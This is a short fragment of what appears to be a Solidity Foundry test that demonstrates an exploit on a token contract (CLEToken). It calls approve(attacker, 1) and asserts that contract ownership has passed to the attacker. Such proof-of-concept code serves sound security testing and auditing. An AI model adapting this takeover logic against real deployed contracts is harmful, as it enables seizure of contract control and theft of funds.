            console.log("Trying approve(attacker, 1)...");
            CLEToken(TARGET).approve(attacker, 1);

            newOwner = CLEToken(TARGET).owner();
            console.log("New owner after third attempt:", newOwner);
        }

        // Final assertion
        assertEq(newOwner, attacker, "Owner should be attacker after exploit");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
